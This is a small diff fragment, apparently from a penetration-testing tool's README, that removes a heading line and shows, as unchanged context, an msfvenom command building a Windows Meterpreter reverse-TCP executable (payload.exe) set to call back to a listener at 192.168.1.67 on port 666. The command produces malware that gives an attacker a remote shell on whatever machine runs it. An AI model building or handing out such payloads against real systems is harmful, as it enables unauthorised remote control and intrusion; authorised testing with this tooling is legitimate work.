@@ -47,7 +47,6 @@
 <br />
 ---
 
-# Advanced (manual) use.
 # Build msfvenom binary
     sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f exe -o payload.exe
 
